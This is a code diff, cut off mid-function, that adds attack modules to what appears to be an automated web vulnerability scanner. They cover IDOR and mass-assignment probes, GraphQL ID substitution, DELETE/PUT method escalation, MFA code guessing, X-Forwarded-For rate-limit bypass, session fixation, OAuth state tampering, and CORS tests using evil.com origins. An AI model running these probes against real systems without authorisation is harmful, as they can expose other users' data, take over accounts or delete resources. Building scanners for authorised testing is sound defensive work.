@@ -1113,6 +1643,12 @@ class IDORAgent(SwarmAgent):
 
     _ID_PARAMS = {"id", "user_id", "account_id", "order_id", "file_id",
                   "doc_id", "ticket_id", "profile_id", "item_id", "record_id", "uuid"}
+
+    _HASH_FUNCS = ["md5", "sha1", "sha256"]
+    _MASS_ASSIGN_FIELDS = ["role", "admin", "is_admin", "privilege", "group_id",
+                           "account_type", "permission"]
+    _GRAPHQL_IDOR_TEMPLATE = '{"query":"{ user(id: %s) { id email role balance } }"}'
+    _BATCH_SUFFIXES = ["/export", "/download", "/batch", "/list", "/all", "/bulk"]
 
     def __init__(self, **kwargs):
         super().__init__(AgentType.IDOR, **kwargs)
@@ -1166,8 +1702,118 @@ class IDORAgent(SwarmAgent):
                         priority      = 0.75,
                     ))
 
+        # UUID IDOR — detect UUID pattern in path
+        uuid_bad = [
+            "00000000-0000-0000-0000-000000000001",
+            "00000000-0000-0000-0000-000000000002",
+            "ffffffff-ffff-ffff-ffff-ffffffffffff",
+        ]
+        for ep in endpoints[:25]:
+            if re.search(r'[0-9a-f]{8}-[0-9a-f]{4}-', ep):
+                for bad_uuid in uuid_bad:
+                    new_ep = re.sub(
+                        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
+                        bad_uuid, ep, count=1
+                    )
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = new_ep,
+                        attack_vector = "idor_uuid",
+                        confidence    = self.memory.rate("idor_uuid", 0.55),
+                        payload       = bad_uuid,
+                        context       = {"original": ep, "modified": new_ep},
+                        reasoning     = f"UUID IDOR: replace UUID in path with known-bad {bad_uuid}",
+                        priority      = 0.70,
+                    ))
+
+        # Hashed ID IDOR — path segment looks like hex hash (32/40/64 chars)
+        for ep in endpoints[:25]:
+            for segment in ep.split("/"):
+                if re.fullmatch(r'[0-9a-f]{32}|[0-9a-f]{40}|[0-9a-f]{64}', segment):
+                    probe_ep = ep.replace(segment, "a" * len(segment))
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = probe_ep,
+                        attack_vector = "idor_hashed",
+                        confidence    = self.memory.rate("idor_hashed", 0.45),
+                        payload       = "a" * len(segment),
+                        context       = {"original": ep, "modified": probe_ep, "hash": segment},
+                        reasoning     = f"Hashed ID IDOR: {len(segment)}-char hex segment may be guessable",
+                        priority      = 0.55,
+                    ))
+
+        # Mass assignment — PUT/PATCH endpoints under /api/
+        api_eps = [ep for ep in endpoints if "/api/" in ep]
+        for ep in api_eps[:10]:
+            extra_fields = {f: True if "admin" in f or "is_" in f else "admin"
+                            for f in self._MASS_ASSIGN_FIELDS}
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "mass_assignment",
+                confidence    = self.memory.rate("mass_assignment", 0.48),
+                payload       = json.dumps(extra_fields),
+                context       = {"endpoint": ep, "extra_fields": extra_fields, "method": "PUT"},
+                reasoning     = "PUT/PATCH endpoint may accept privileged fields via mass assignment",
+                priority      = 0.68,
+            ))
+
+        # GraphQL IDOR
+        graphql_eps = [ep for ep in endpoints if "/graphql" in ep.lower()]
+        for ep in graphql_eps[:5]:
+            for alt_id in [1, 2, 3]:
+                gql_payload = self._GRAPHQL_IDOR_TEMPLATE % alt_id
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = ep,
+                    attack_vector = "graphql_idor",
+                    confidence    = self.memory.rate("graphql_idor", 0.52),
+                    payload       = gql_payload,
+                    context       = {"endpoint": ep, "alt_id": alt_id},
+                    reasoning     = f"GraphQL IDOR: query user(id:{alt_id}) without ownership check",
+                    priority      = 0.72,
+                ))
+
+        # Batch export endpoints
+        for ep in endpoints[:20]:
+            base = ep.rstrip("/")
+            for suffix in self._BATCH_SUFFIXES:
+                batch_ep = base + suffix
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = batch_ep,
+                    attack_vector = "idor_batch",
+                    confidence    = self.memory.rate("idor_batch", 0.42),
+                    payload       = suffix,
+                    context       = {"endpoint": batch_ep, "base": ep, "suffix": suffix},
+                    reasoning     = f"Batch endpoint {suffix} may expose all resources without auth",
+                    priority      = 0.55,
+                ))
+
+        # HTTP method escalation — derive from existing path-based IDOR hypotheses
+        path_hypotheses = [h for h in hypotheses if h.attack_vector == "idor_path"]
+        for ph in path_hypotheses[:10]:
+            for method in ["PUT", "DELETE", "PATCH"]:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = ph.target_node,
+                    attack_vector = "idor_method_escalation",
+                    confidence    = self.memory.rate("idor_method_escalation", 0.40),
+                    payload       = method,
+                    context       = {"endpoint": ph.target_node, "method": method,
+                                     "original": ph.context.get("original", "")},
+                    reasoning     = f"HTTP {method} on resource may not check ownership",
+                    priority      = 0.60,
+                ))
+
         hypotheses.sort(key=lambda h: h.priority, reverse=True)
-        return hypotheses[:50]
+        return hypotheses[:80]
 
     async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
         findings: List[AgentFinding] = []
@@ -1177,45 +1823,195 @@ class IDORAgent(SwarmAgent):
             if self._stop_event.is_set():
                 break
             try:
-                for session in sessions[:2]:
-                    url = (h.target_node if h.attack_vector == "idor_path"
-                           else h.context.get("endpoint", h.target_node))
-                    params = ({h.context.get("param", ""): h.payload}
-                              if h.attack_vector != "idor_path" else {})
+                if h.attack_vector in ("idor_horizontal", "idor_path"):
+                    for session in sessions[:2]:
+                        url = (h.target_node if h.attack_vector == "idor_path"
+                               else h.context.get("endpoint", h.target_node))
+                        params = ({h.context.get("param", ""): h.payload}
+                                  if h.attack_vector != "idor_path" else {})
+                        result = await self._tool("httpx",
+                            url=url,
+                            params=params,
+                            headers={
+                                "Cookie":        session.get("cookie", ""),
+                                "Authorization": session.get("token", ""),
+                            },
+                        )
+                        data   = result.get("data") or {}
+                        status = data.get("status", 0) if isinstance(data, dict) else 0
+                        body   = str(data.get("body", "") if isinstance(data, dict) else data)
+
+                        alt_id = str(h.context.get("alt_id", h.payload))
+                        other_markers = [
+                            f'"id":{alt_id}', f'"user_id":{alt_id}',
+                            f'"order_id":{alt_id}', f'"account_id":{alt_id}',
+                            session.get("other_username", "__UNLIKELY_MARKER__"),
+                        ]
+                        if status == 200 and len(body) > 40 and any(m in body for m in other_markers):
+                            findings.append(self._finding(
+                                target         = url,
+                                vuln_type      = "idor",
+                                severity       = "high",
+                                title          = f"IDOR ({h.attack_vector}) — ID {h.payload} accessible",
+                                description    = "Changing the object identifier exposes another user's data.",
+                                payload        = h.payload,
+                                evidence       = body[:500],
+                                cvss           = 8.1,
+                                confidence     = 0.82,
+                                reproduced     = True,
+                                chain_potential= ["idor_to_account_takeover", "idor_data_breach"],
+                                remediation    = "Enforce server-side ownership checks on every object lookup.",
+                            ))
+                            break   # one finding per hypothesis is enough
+
+                elif h.attack_vector in ("idor_uuid", "idor_hashed"):
+                    sess0 = sessions[0] if sessions else {}
                     result = await self._tool("httpx",
-                        url=url,
-                        params=params,
+                        url=h.target_node,
                         headers={
-                            "Cookie":        session.get("cookie", ""),
-                            "Authorization": session.get("token", ""),
+                            "Cookie":        sess0.get("cookie", ""),
+                            "Authorization": sess0.get("token", ""),
                         },
                     )
                     data   = result.get("data") or {}
                     status = data.get("status", 0) if isinstance(data, dict) else 0
                     body   = str(data.get("body", "") if isinstance(data, dict) else data)
-
-                    alt_id = str(h.context.get("alt_id", h.payload))
-                    other_markers = [
-                        f'"id":{alt_id}', f'"user_id":{alt_id}',
-                        f'"order_id":{alt_id}', f'"account_id":{alt_id}',
-                        session.get("other_username", "__UNLIKELY_MARKER__"),
-                    ]
-                    if status == 200 and len(body) > 40 and any(m in body for m in other_markers):
+                    if status == 200 and len(body) > 40:
                         findings.append(self._finding(
-                            target         = url,
-                            vuln_type      = "idor",
+                            target         = h.target_node,
+                            vuln_type      = h.attack_vector,
                             severity       = "high",
-                            title          = f"IDOR ({h.attack_vector}) — ID {h.payload} accessible",
-                            description    = "Changing the object identifier exposes another user's data.",
+                            title          = f"IDOR ({h.attack_vector}) — {h.payload} accessible",
+                            description    = "Object identifier substitution exposes another resource.",
                             payload        = h.payload,
                             evidence       = body[:500],
                             cvss           = 8.1,
-                            confidence     = 0.82,
+                            confidence     = 0.78,
                             reproduced     = True,
-                            chain_potential= ["idor_to_account_takeover", "idor_data_breach"],
+                            chain_potential= ["idor_to_data_breach"],
                             remediation    = "Enforce server-side ownership checks on every object lookup.",
                         ))
-                        break   # one finding per hypothesis is enough
+
+                elif h.attack_vector == "mass_assignment":
+                    sess0 = sessions[0] if sessions else {}
+                    extra = h.context.get("extra_fields", {})
+                    result = await self._tool("httpx",
+                        url=h.target_node,
+                        method="PUT",
+                        json=extra,
+                        headers={
+                            "Cookie":        sess0.get("cookie", ""),
+                            "Authorization": sess0.get("token", ""),
+                        },
+                    )
+                    data   = result.get("data") or {}
+                    status = data.get("status", 0) if isinstance(data, dict) else 0
+                    body   = str(data.get("body", "") if isinstance(data, dict) else data)
+                    if status == 200 and any(f in body for f in ["admin", "role", "privilege"]):
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "mass_assignment",
+                            severity       = "critical",
+                            title          = "Mass Assignment — Privileged Field Accepted",
+                            description    = "API accepted privileged fields in PUT request body.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 9.1,
+                            confidence     = 0.82,
+                            reproduced     = True,
+                            chain_potential= ["mass_assignment_to_privilege_escalation"],
+                            remediation    = "Use explicit allowlists for accepted fields; reject unknown properties.",
+                        ))
+
+                elif h.attack_vector == "graphql_idor":
+                    sess0 = sessions[0] if sessions else {}
+                    result = await self._tool("httpx",
+                        url=h.target_node,
+                        method="POST",
+                        json=json.loads(h.payload),
+                        headers={
+                            "Content-Type":  "application/json",
+                            "Cookie":        sess0.get("cookie", ""),
+                            "Authorization": sess0.get("token", ""),
+                        },
+                    )
+                    data   = result.get("data") or {}
+                    status = data.get("status", 0) if isinstance(data, dict) else 0
+                    body   = str(data.get("body", "") if isinstance(data, dict) else data)
+                    if status == 200 and '"email"' in body and '"id"' in body:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "graphql_idor",
+                            severity       = "high",
+                            title          = f"GraphQL IDOR — User Data Exposed (id:{h.context.get('alt_id')})",
+                            description    = "GraphQL query returns another user's data without ownership check.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 8.3,
+                            confidence     = 0.80,
+                            reproduced     = True,
+                            chain_potential= ["graphql_idor_to_data_breach"],
+                            remediation    = "Implement field-level authorization in GraphQL resolvers.",
+                        ))
+
+                elif h.attack_vector == "idor_batch":
+                    sess0 = sessions[0] if sessions else {}
+                    result = await self._tool("httpx",
+                        url=h.target_node,
+                        method="GET",
+                        headers={
+                            "Cookie":        sess0.get("cookie", ""),
+                            "Authorization": sess0.get("token", ""),
+                        },
+                    )
+                    data   = result.get("data") or {}
+                    status = data.get("status", 0) if isinstance(data, dict) else 0
+                    body   = str(data.get("body", "") if isinstance(data, dict) else data)
+                    if status == 200 and ('[{' in body or '"items"' in body):
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "idor_batch",
+                            severity       = "high",
+                            title          = f"IDOR Batch Endpoint — Mass Data Exposure at {h.context.get('suffix','')}",
+                            description    = "Batch endpoint returns list of all resources without scoping to current user.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 7.5,
+                            confidence     = 0.75,
+                            reproduced     = True,
+                            chain_potential= ["idor_batch_to_mass_data_breach"],
+                            remediation    = "Scope batch endpoints to the authenticated user's owned resources.",
+                        ))
+
+                elif h.attack_vector == "idor_method_escalation":
+                    sess0 = sessions[0] if sessions else {}
+                    method = h.context.get("method", "DELETE")
+                    result = await self._tool("httpx",
+                        url=h.target_node,
+                        method=method,
+                        headers={
+                            "Cookie":        sess0.get("cookie", ""),
+                            "Authorization": sess0.get("token", ""),
+                        },
+                    )
+                    data   = result.get("data") or {}
+                    status = data.get("status", 0) if isinstance(data, dict) else 0
+                    if status == 200:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "idor_method_escalation",
+                            severity       = "high",
+                            title          = f"IDOR Method Escalation — {method} returns 200",
+                            description    = f"HTTP {method} succeeded (not 405), indicating missing method-level auth.",
+                            payload        = method,
+                            evidence       = f"HTTP {method} {h.target_node} → {status}",
+                            cvss           = 8.0,
+                            confidence     = 0.72,
+                            reproduced     = True,
+                            chain_potential= ["idor_method_to_data_deletion"],
+                            remediation    = "Enforce ownership checks for all HTTP methods on object endpoints.",
+                        ))
+
             except Exception as exc:
                 logger.debug("[%s] IDOR test error: %s", self.name, exc)
             await asyncio.sleep(0.05)
@@ -1238,6 +2034,16 @@ class AuthAgent(SwarmAgent):
     ]
 
     _JWT_ATTACKS = ["none_alg", "weak_secret_brute", "kid_path_traversal", "jwks_spoof"]
+
+    _TIMING_USERNAMES = [
+        "admin", "administrator", "root", "superuser", "devops",
+        "support", "api", "test", "user", "guest",
+    ]
+    _RATE_LIMIT_HEADERS = [
+        {"X-Forwarded-For": f"1.2.3.{i}"} for i in range(1, 11)
+    ]
+    _MFA_BYPASS_CODES = ["000000", "123456", "111111", "999999", "000001"]
+    _OAUTH_STATES = ["", "null", "undefined", "csrf_test_state"]
 
     def __init__(self, **kwargs):
         super().__init__(AgentType.AUTH, **kwargs)
@@ -1300,8 +2106,86 @@ class AuthAgent(SwarmAgent):
                     priority      = 0.70 if attack == "none_alg" else 0.45,
                 ))
 
+        # Timing username enumeration
+        for ep in auth_eps[:5]:
+            for uname in self._TIMING_USERNAMES:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = ep,
+                    attack_vector = "timing_user_enum",
+                    confidence    = self.memory.rate("timing_user_enum", 0.45),
+                    payload       = uname,
+                    context       = {"endpoint": ep, "username": uname},
+                    reasoning     = f"Measure response time delta for '{uname}' vs unknown user",
+                    priority      = 0.45,
+                ))
+
+        # Rate limit bypass via X-Forwarded-For rotation
+        login_eps = [ep for ep in auth_eps if any(
+            k in ep.lower() for k in ["login", "signin", "auth", "token"]
+        )]
+        for ep in login_eps[:5]:
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "rate_limit_bypass",
+                confidence    = self.memory.rate("rate_limit_bypass", 0.48),
+                payload       = json.dumps(self._RATE_LIMIT_HEADERS[:5]),
+                context       = {"endpoint": ep, "headers_pool": self._RATE_LIMIT_HEADERS},
+                reasoning     = "Rotating X-Forwarded-For may bypass per-IP rate limiting",
+                priority      = 0.48,
+            ))
+
+        # MFA bypass
+        mfa_ep = context.get("mfa_endpoint")
+        if mfa_ep:
+            for code in self._MFA_BYPASS_CODES:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = mfa_ep,
+                    attack_vector = "mfa_bypass",
+                    confidence    = self.memory.rate("mfa_bypass", 0.38),
+                    payload       = code,
+                    context       = {"endpoint": mfa_ep, "code": code},
+                    reasoning     = f"MFA bypass attempt with common/sequential code {code}",
+                    priority      = 0.38,
+                ))
+
+        # Session fixation
+        for ep in login_eps[:3]:
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "session_fixation",
+                confidence    = self.memory.rate("session_fixation", 0.42),
+                payload       = "FIXEDSESSID=attacker_controlled_value",
+                context       = {"endpoint": ep},
+                reasoning     = "Pre-set session ID may be accepted and elevated after login",
+                priority      = 0.42,
+            ))
+
+        # OAuth state missing
+        oauth_eps = context.get("oauth_endpoints", [])
+        for ep in oauth_eps[:5]:
+            for state in self._OAUTH_STATES:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = ep,
+                    attack_vector = "oauth_state_missing",
+                    confidence    = self.memory.rate("oauth_state_missing", 0.55),
+                    payload       = state,
+                    context       = {"endpoint": ep, "state": state},
+                    reasoning     = f"OAuth flow with state='{state}' may allow CSRF",
+                    priority      = 0.55,
+                ))
+
         hypotheses.sort(key=lambda h: h.priority, reverse=True)
-        return hypotheses[:35]
+        return hypotheses[:50]
 
     async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
         findings: List[AgentFinding] = []
@@ -1360,9 +2244,672 @@ class AuthAgent(SwarmAgent):
                             chain_potential= ["weak_creds_to_full_compromise"],
                             remediation    = "Enforce strong password policy; disable default accounts.",
                         ))
+
+                elif h.attack_vector == "timing_user_enum":
+                    import time as _time
+                    uname = h.context.get("username", "admin")
+                    # Valid-looking username vs garbage
+                    t0 = _time.monotonic()
+                    await self._tool("httpx", url=h.target_node, method="POST",
+                                     data={"username": uname, "password": "InvalidPwd!@#"})
+                    t1 = _time.monotonic()
+                    await self._tool("httpx", url=h.target_node, method="POST",
+                                     data={"username": f"nonexistent_{uuid.uuid4().hex[:6]}",
+                                           "password": "InvalidPwd!@#"})
+                    t2 = _time.monotonic()
+                    delta_ms = abs((t1 - t0) - (t2 - t1)) * 1000
+                    if delta_ms > 200:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "timing_user_enum",
+                            severity       = "medium",
+                            title          = f"Username Enumeration via Timing — '{uname}' ({delta_ms:.0f}ms delta)",
+                            description    = "Response time differs for valid vs invalid usernames, enabling enumeration.",
+                            payload        = uname,
+                            evidence       = f"Timing delta: {delta_ms:.0f}ms for '{uname}' vs random username",
+                            cvss           = 5.3,
+                            confidence     = 0.68,
+                            reproduced     = True,
+                            chain_potential= ["timing_enum_to_brute_force"],
+                            remediation    = "Normalize response time regardless of username validity.",
+                        ))
+
+                elif h.attack_vector == "rate_limit_bypass":
+                    headers_pool = h.context.get("headers_pool", self._RATE_LIMIT_HEADERS)
+                    statuses = []
+                    for hdr in headers_pool[:5]:
+                        result = await self._tool("httpx", url=h.target_node, method="POST",
+                                                   data={"username": "admin", "password": "wrong"},
+                                                   headers=hdr)
+                        data = result.get("data") or {}
+                        statuses.append(data.get("status", 0) if isinstance(data, dict) else 0)
+                        await asyncio.sleep(0.05)
+                    if 429 not in statuses:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "missing_rate_limit",
+                            severity       = "medium",
+                            title          = "Rate Limit Bypassable via X-Forwarded-For Rotation",
+                            description    = "5 consecutive login attempts with rotating X-Forwarded-For headers triggered no 429.",
+                            payload        = h.payload,
+                            evidence       = f"Statuses: {statuses}",
+                            cvss           = 5.9,
+                            confidence     = 0.72,
+                            reproduced     = True,
+                            chain_potential= ["rate_limit_bypass_to_brute_force"],
+                            remediation    = "Rate-limit by user/account in addition to IP; don't trust X-Forwarded-For.",
+                        ))
+
+                elif h.attack_vector == "mfa_bypass":
+                    code = h.context.get("code", "000000")
+                    result = await self._tool("httpx", url=h.target_node, method="POST",
+                                              data={"code": code, "otp": code, "token": code})
+                    data   = result.get("data") or {}
+                    status = data.get("status", 0) if isinstance(data, dict) else 0
+                    body   = str(data.get("body", "") if isinstance(data, dict) else data).lower()
+                    if status == 200 and any(k in body for k in ["success", "verified", "token", "session"]):
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "mfa_bypass",
+                            severity       = "critical",
+                            title          = f"MFA Bypass — Code '{code}' Accepted",
+                            description    = "Common/sequential MFA code accepted, bypassing second factor.",
+                            payload        = code,
+                            evidence       = body[:300],
+                            cvss           = 9.4,
+                            confidence     = 0.90,
+                            reproduced     = True,
+                            chain_potential= ["mfa_bypass_to_account_takeover"],
+                            remediation    = "Use cryptographically random TOTP; rate-limit MFA attempts.",
+                        ))
+
+                elif h.attack_vector == "session_fixation":
+                    # Check if a pre-set cookie survives login
+                    fixed_cookie = "SESSIONID=attacker_controlled_fixed_value"
+                    result = await self._tool("httpx", url=h.target_node, method="POST",
+                                              data={"username": "admin", "password": "admin"},
+                                              headers={"Cookie": fixed_cookie})
+                    data    = result.get("data") or {}
+                    resp_cookies = str(data.get("headers", {}).get("set-cookie", "")
+                                       if isinstance(data, dict) else "")
+                    if "attacker_controlled_fixed_value" in resp_cookies or not resp_cookies:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "session_fixation",
+                            severity       = "high",
+                            title          = "Session Fixation — Pre-auth Session ID Not Rotated",
+                            description    = "Login does not issue a new session ID, allowing session fixation attacks.",
+                            payload        = fixed_cookie,
+                            evidence       = f"Set-Cookie after login: {resp_cookies[:200]}",
+                            cvss           = 7.3,
+                            confidence     = 0.65,
+                            reproduced     = False,
+                            chain_potential= ["session_fixation_to_account_takeover"],
+                            remediation    = "Regenerate session ID on authentication; invalidate pre-auth sessions.",
+                        ))
+
+                elif h.attack_vector == "oauth_state_missing":
+                    state = h.context.get("state", "")
+                    import urllib.parse
+                    sep = "&" if "?" in h.target_node else "?"
+                    url_with_state = f"{h.target_node}{sep}state={urllib.parse.quote(str(state))}"
+                    result = await self._tool("httpx", url=url_with_state, method="GET")
+                    data   = result.get("data") or {}
+                    status = data.get("status", 0) if isinstance(data, dict) else 0
+                    hdrs   = data.get("headers", {}) if isinstance(data, dict) else {}
+                    location = str(hdrs.get("location", "") or hdrs.get("Location", ""))
+                    if status in [301, 302] and location and "error" not in location.lower():
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "oauth_state_missing",
+                            severity       = "medium",
+                            title          = f"OAuth CSRF Risk — state='{state}' Accepted Without Validation",
+                            description    = "OAuth flow proceeds with empty/null state parameter, enabling CSRF.",
+                            payload        = state,
+                            evidence       = f"Redirect to: {location[:300]}",
+                            cvss           = 6.1,
+                            confidence     = 0.68,
+                            reproduced     = True,
+                            chain_potential= ["oauth_csrf_to_account_link"],
+                            remediation    = "Enforce non-empty, cryptographically random state parameter; validate on callback.",
+                        ))
+
             except Exception as exc:
                 logger.debug("[%s] Auth test error: %s", self.name, exc)
             await asyncio.sleep(0.06)
+
+        return findings
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+
+class CORSAgent(SwarmAgent):
+    """CORS misconfiguration specialist."""
+
+    RELEVANT_NODE_TYPES      = ["url", "api_endpoint"]
+    RELEVANT_LABEL_KEYWORDS  = ["api", "cors", "access-control", "origin"]
+
+    _ORIGIN_PAYLOADS = [
+        "null",
+        "https://evil.com",
+        "https://attacker.com",
+    ]
+
+    def __init__(self, **kwargs):
+        super().__init__(AgentType.CORS, **kwargs)
+
+    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
+        hypotheses: List[Hypothesis] = []
+        endpoints  = context.get("endpoints", [target])
+
+        # Derive the target domain from the target URL
+        try:
+            from urllib.parse import urlparse as _urlparse
+            target_domain = _urlparse(target).netloc or target
+        except Exception:
+            target_domain = target
+
+        for ep in endpoints[:20]:
+            # null origin
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "cors_null_origin",
+                confidence    = self.memory.rate("cors_null_origin", 0.45),
+                payload       = "null",
+                context       = {"endpoint": ep, "origin": "null"},
+                reasoning     = "Null origin may be reflected in ACAO header, enabling sandboxed iframe attacks",
+                priority      = 0.45,
+            ))
+            # Origin reflection
+            evil_origin = f"https://evil{target_domain}"
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "cors_origin_reflect",
+                confidence    = self.memory.rate("cors_origin_reflect", 0.50),
+                payload       = evil_origin,
+                context       = {"endpoint": ep, "origin": evil_origin},
+                reasoning     = "Server may reflect any Origin verbatim in ACAO header",
+                priority      = 0.50,
+            ))
+            # Subdomain bypass
+            sub_origin = f"https://evil.{target_domain}"
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "cors_subdomain_bypass",
+                confidence    = self.memory.rate("cors_subdomain_bypass", 0.40),
+                payload       = sub_origin,
+                context       = {"endpoint": ep, "origin": sub_origin},
+                reasoning     = "Wildcard subdomain CORS policy may be exploited via attacker subdomain",
+                priority      = 0.40,
+            ))
+            # Preflight bypass
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "cors_preflight_bypass",
+                confidence    = self.memory.rate("cors_preflight_bypass", 0.35),
+                payload       = "DELETE",
+                context       = {"endpoint": ep, "method": "DELETE"},
+                reasoning     = "Missing OPTIONS enforcement may allow dangerous HTTP methods cross-origin",
+                priority      = 0.35,
+            ))
+            # HTTP downgrade
+            http_origin = f"http://{target_domain}"
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "cors_http_downgrade",
+                confidence    = self.memory.rate("cors_http_downgrade", 0.38),
+                payload       = http_origin,
+                context       = {"endpoint": ep, "origin": http_origin},
+                reasoning     = "HTTP (non-HTTPS) origin may be reflected, enabling MitM cross-origin reads",
+                priority      = 0.38,
+            ))
+
+        hypotheses.sort(key=lambda h: h.priority, reverse=True)
+        return hypotheses[:40]
+
+    async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
+        findings: List[AgentFinding] = []
+        seen: set = set()
+
+        for h in hypotheses:
+            if self._stop_event.is_set():
+                break
+            dedup_key = f"{h.target_node}:{h.attack_vector}"
+            if dedup_key in seen:
+                await asyncio.sleep(0.02)
+                continue
+            try:
+                if h.attack_vector == "cors_preflight_bypass":
+                    # Step 1: OPTIONS preflight
+                    opts_result = await self._tool("http_request", url=h.target_node, method="OPTIONS",
+                                                    headers={"Origin": "https://evil.com",
+                                                             "Access-Control-Request-Method": "DELETE"})
+                    # Step 2: DELETE request
+                    del_result  = await self._tool("http_request", url=h.target_node, method="DELETE",
+                                                    headers={"Origin": "https://evil.com"})
+                    del_data    = del_result.get("data") or {}
+                    del_status  = del_data.get("status", 0) if isinstance(del_data, dict) else 0
+                    if del_status == 200:
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "cors_preflight_bypass",
+                            severity       = "high",
+                            title          = "CORS Preflight Bypass — DELETE Allowed Cross-Origin",
+                            description    = "Server permits cross-origin DELETE without proper CORS preflight enforcement.",
+                            payload        = h.payload,
+                            evidence       = f"DELETE {h.target_node} → {del_status}",
+                            cvss           = 7.5,
+                            confidence     = 0.78,
+                            reproduced     = True,
+                            chain_potential= ["cors_preflight_to_csrf_delete"],
+                            remediation    = "Validate CORS preflight for all non-simple methods; restrict allowed methods.",
+                        ))
+                else:
+                    origin = h.context.get("origin", h.payload)
+                    result = await self._tool("http_request", url=h.target_node, method="GET",
+                                              headers={"Origin": origin})
+                    data   = result.get("data") or {}
+                    resp_headers = data.get("headers", {}) if isinstance(data, dict) else {}
+                    # Normalise header name case
+                    acao = (resp_headers.get("access-control-allow-origin") or
+                            resp_headers.get("Access-Control-Allow-Origin", ""))
+                    acac = (resp_headers.get("access-control-allow-credentials") or
+                            resp_headers.get("Access-Control-Allow-Credentials", "")).lower()
+
+                    if acao == origin and acac == "true":
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = h.attack_vector,
+                            severity       = "critical",
+                            title          = f"CORS with Credentials — Origin '{origin}' Reflected",
+                            description    = "Server reflects attacker-controlled origin with Access-Control-Allow-Credentials: true.",
+                            payload        = origin,
+                            evidence       = f"ACAO: {acao} | ACAC: {acac}",
+                            cvss           = 9.0,
+                            confidence     = 0.92,
+                            reproduced     = True,
+                            chain_potential= ["cors_creds_to_account_takeover"],
+                            remediation    = "Use an explicit origin allowlist; never combine wildcard or reflected origins with credentials.",
+                        ))
+                    elif acao == "null":
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "cors_null_origin",
+                            severity       = "high",
+                            title          = "CORS Null Origin Accepted",
+                            description    = "Server allows null origin, enabling attacks from sandboxed iframes.",
+                            payload        = "null",
+                            evidence       = f"ACAO: {acao}",
+                            cvss           = 7.4,
+                            confidence     = 0.85,
+                            reproduced     = True,
+                            chain_potential= ["cors_null_to_data_exfil"],
+                            remediation    = "Reject 'null' origin; use an explicit allowlist.",
+                        ))
+                    elif acao == "*":
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "cors_wildcard",
+                            severity       = "medium",
+                            title          = "CORS Wildcard Origin (Access-Control-Allow-Origin: *)",
+                            description    = "Wildcard ACAO exposes endpoint to any origin (acceptable only for truly public APIs).",
+                            payload        = origin,
+                            evidence       = f"ACAO: {acao}",
+                            cvss           = 5.3,
+                            confidence     = 0.88,
+                            reproduced     = True,
+                            chain_potential= ["cors_wildcard_amplifies_xss"],
+                            remediation    = "Restrict ACAO to known origins; avoid wildcard on authenticated endpoints.",
+                        ))
+                    elif acao == origin:
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
